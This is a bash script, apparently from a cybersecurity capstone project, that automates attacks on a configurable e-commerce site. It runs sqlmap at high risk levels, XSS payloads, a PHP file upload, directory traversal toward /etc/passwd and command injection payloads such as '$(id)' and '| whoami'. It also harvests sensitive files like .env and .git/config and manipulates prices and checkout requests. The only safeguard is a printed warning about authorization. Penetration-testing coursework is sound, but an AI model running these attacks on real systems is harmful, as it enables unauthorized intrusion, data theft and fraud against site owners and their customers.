#!/bin/bash
# Exploitation Script for Cybersecurity Capstone Project
# This script performs ethical exploitation of identified vulnerabilities

echo "=========================================="
echo "Ethical Exploitation - E-commerce Website"
echo "=========================================="

# Check if target information is provided
if [ ! -f "../target_info.txt" ]; then
    echo "Error: target_info.txt not found!"
    echo "Please run setup.sh first and fill in target information."
    exit 1
fi

# Source target information
source ../target_info.txt

if [ -z "$TARGET_IP" ] && [ -z "$TARGET_DOMAIN" ]; then
    echo "Error: TARGET_IP or TARGET_DOMAIN must be set in target_info.txt"
    exit 1
fi

# Set target
if [ -n "$TARGET_DOMAIN" ]; then
    TARGET="$TARGET_DOMAIN"
else
    TARGET="$TARGET_IP"
fi

echo "Target: $TARGET"
echo "Starting ethical exploitation at $(date)"
echo ""
echo "WARNING: This script performs ethical exploitation for educational purposes only."
echo "Ensure you have proper authorization before proceeding."
echo ""

# Create log file for this session
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
LOG_FILE="../logs/exploitation_${TIMESTAMP}.log"
REPORT_FILE="../reports/exploitation_report_${TIMESTAMP}.txt"

echo "Ethical Exploitation Report - $TARGET" > "$REPORT_FILE"
echo "Generated: $(date)" >> "$REPORT_FILE"
echo "==========================================" >> "$REPORT_FILE"
echo "" >> "$REPORT_FILE"

# 1. SQL Injection Exploitation
echo "1. SQL Injection Exploitation"
echo "============================="
echo "1. SQL Injection Exploitation" >> "$REPORT_FILE"
echo "=============================" >> "$REPORT_FILE"

echo "Testing for SQL injection vulnerabilities..."
echo "SQL injection test results:" >> "$REPORT_FILE"

# Test common SQL injection payloads
echo "Testing basic SQL injection payloads:" >> "$REPORT_FILE"
sqlmap -u "http://$TARGET" --batch --crawl=2 --level=5 --risk=3 --dbs >> "$REPORT_FILE" 2>&1
echo "" >> "$REPORT_FILE"

# Test specific parameters if login forms are found
echo "Testing login forms for SQL injection:" >> "$REPORT_FILE"
sqlmap -u "http://$TARGET/login" --data="username=admin&password=admin" --batch --level=3 --risk=2 >> "$REPORT_FILE" 2>&1
echo "" >> "$REPORT_FILE"

# 2. Cross-Site Scripting (XSS) Exploitation
echo "2. Cross-Site Scripting (XSS) Exploitation"
echo "==========================================="
echo "2. Cross-Site Scripting (XSS) Exploitation" >> "$REPORT_FILE"
echo "===========================================" >> "$REPORT_FILE"

echo "Testing for XSS vulnerabilities..."
echo "XSS test results:" >> "$REPORT_FILE"

# Test for reflected XSS
echo "Testing for reflected XSS:" >> "$REPORT_FILE"
# Common XSS payloads
xss_payloads=(
    "<script>alert('XSS')</script>"
    "<img src=x onerror=alert('XSS')>"
    "javascript:alert('XSS')"
    "<svg onload=alert('XSS')>"
)

for payload in "${xss_payloads[@]}"; do
    echo "Testing payload: $payload" >> "$REPORT_FILE"
    curl -s "http://$TARGET/?search=$payload" >> "$REPORT_FILE" 2>&1
    echo "" >> "$REPORT_FILE"
done

# 3. File Upload Exploitation
echo "3. File Upload Exploitation"
echo "==========================="
echo "3. File Upload Exploitation" >> "$REPORT_FILE"
echo "===========================" >> "$REPORT_FILE"

echo "Testing for file upload vulnerabilities..."
echo "File upload test results:" >> "$REPORT_FILE"

# Test for unrestricted file upload
echo "Testing file upload functionality:" >> "$REPORT_FILE"
# Create a test PHP file
echo '<?php echo "File upload test successful"; ?>' > test_upload.php
echo "Created test file: test_upload.php" >> "$REPORT_FILE"

# Try to upload the file
curl -X POST -F "file=@test_upload.php" "http://$TARGET/upload" >> "$REPORT_FILE" 2>&1
echo "" >> "$REPORT_FILE"

# Clean up test file
rm -f test_upload.php

# 4. Authentication Bypass
echo "4. Authentication Bypass"
echo "========================"
echo "4. Authentication Bypass" >> "$REPORT_FILE"
echo "========================" >> "$REPORT_FILE"

echo "Testing for authentication bypass vulnerabilities..."
echo "Authentication bypass test results:" >> "$REPORT_FILE"

# Test for SQL injection in login
echo "Testing SQL injection in authentication:" >> "$REPORT_FILE"
sqlmap -u "http://$TARGET/login" --data="username=admin&password=admin" --batch --level=3 --risk=2 --technique=B >> "$REPORT_FILE" 2>&1
echo "" >> "$REPORT_FILE"

# Test for weak session management
echo "Testing session management:" >> "$REPORT_FILE"
# Check for predictable session IDs
echo "Checking session ID predictability:" >> "$REPORT_FILE"
for i in {1..5}; do
    curl -s -c cookies.txt "http://$TARGET/login" > /dev/null
    echo "Session $i:" >> "$REPORT_FILE"
    cat cookies.txt >> "$REPORT_FILE"
    echo "" >> "$REPORT_FILE"
done
rm -f cookies.txt

# 5. Directory Traversal Exploitation
echo "5. Directory Traversal Exploitation"
echo "===================================="
echo "5. Directory Traversal Exploitation" >> "$REPORT_FILE"
echo "====================================" >> "$REPORT_FILE"

echo "Testing for directory traversal vulnerabilities..."
echo "Directory traversal test results:" >> "$REPORT_FILE"

# Common directory traversal payloads
traversal_payloads=(
    "../../../etc/passwd"
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
    "....//....//....//etc/passwd"
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
)

for payload in "${traversal_payloads[@]}"; do
    echo "Testing payload: $payload" >> "$REPORT_FILE"
    curl -s "http://$TARGET/?file=$payload" >> "$REPORT_FILE" 2>&1
    echo "" >> "$REPORT_FILE"
done

# 6. Command Injection Exploitation
echo "6. Command Injection Exploitation"
echo "================================="
echo "6. Command Injection Exploitation" >> "$REPORT_FILE"
echo "=================================" >> "$REPORT_FILE"

echo "Testing for command injection vulnerabilities..."
echo "Command injection test results:" >> "$REPORT_FILE"

# Common command injection payloads
cmd_payloads=(
    "; ls -la"
    "| whoami"
    "&& id"
    "`id`"
    "$(id)"
)

for payload in "${cmd_payloads[@]}"; do
    echo "Testing payload: $payload" >> "$REPORT_FILE"
    curl -s "http://$TARGET/?cmd=ping$payload" >> "$REPORT_FILE" 2>&1
    echo "" >> "$REPORT_FILE"
done

# 7. Information Disclosure Exploitation
echo "7. Information Disclosure Exploitation"
echo "======================================"
echo "7. Information Disclosure Exploitation" >> "$REPORT_FILE"
echo "======================================" >> "$REPORT_FILE"

echo "Testing for information disclosure vulnerabilities..."
echo "Information disclosure test results:" >> "$REPORT_FILE"

# Check for sensitive files
echo "Checking for sensitive files:" >> "$REPORT_FILE"
sensitive_files=(
    "phpinfo.php"
    "info.php"
    "test.php"
    "backup.sql"
    "database.sql"
    "config.php"
    "config.ini"
    ".env"
    ".git/config"
    "robots.txt"
    "sitemap.xml"
)

for file in "${sensitive_files[@]}"; do
    echo "Checking: $file" >> "$REPORT_FILE"
    response=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET/$file")
    if [ "$response" = "200" ]; then
        echo "Found: $file (HTTP 200)" >> "$REPORT_FILE"
        curl -s "http://$TARGET/$file" >> "$REPORT_FILE" 2>&1
    else
        echo "Not found: $file (HTTP $response)" >> "$REPORT_FILE"
    fi
    echo "" >> "$REPORT_FILE"
done

# 8. Business Logic Exploitation
echo "8. Business Logic Exploitation"
echo "=============================="
echo "8. Business Logic Exploitation" >> "$REPORT_FILE"
echo "==============================" >> "$REPORT_FILE"

echo "Testing for business logic vulnerabilities..."
echo "Business logic test results:" >> "$REPORT_FILE"

# Test for price manipulation
echo "Testing for price manipulation:" >> "$REPORT_FILE"
curl -s -X POST -d "product_id=1&price=-100" "http://$TARGET/cart" >> "$REPORT_FILE" 2>&1
echo "" >> "$REPORT_FILE"

# Test for quantity manipulation
echo "Testing for quantity manipulation:" >> "$REPORT_FILE"
curl -s -X POST -d "product_id=1&quantity=-1" "http://$TARGET/cart" >> "$REPORT_FILE" 2>&1
echo "" >> "$REPORT_FILE"

# Test for race conditions
echo "Testing for race conditions:" >> "$REPORT_FILE"
# Simulate concurrent requests
for i in {1..5}; do
    curl -s -X POST -d "action=purchase&product_id=1" "http://$TARGET/checkout" &
done
wait
echo "Race condition test completed" >> "$REPORT_FILE"
echo "" >> "$REPORT_FILE"

# 9. Summary and Impact Assessment
echo "9. Exploitation Summary"
echo "======================="
echo "9. Exploitation Summary" >> "$REPORT_FILE"
echo "=======================" >> "$REPORT_FILE"

echo "Exploitation completed at $(date)" >> "$REPORT_FILE"
echo "Log file: $LOG_FILE" >> "$REPORT_FILE"
echo "Report file: $REPORT_FILE" >> "$REPORT_FILE"

echo ""
echo "Ethical exploitation completed!"
echo "Report saved to: $REPORT_FILE"
echo "Log saved to: $LOG_FILE"
echo ""
echo "Next steps:"
echo "1. Review the exploitation report"
echo "2. Assess the impact of successful exploitations"
echo "3. Run documentation script: ./scripts/documentation.sh"
echo "4. Create final penetration testing report"
echo ""
echo "=========================================="
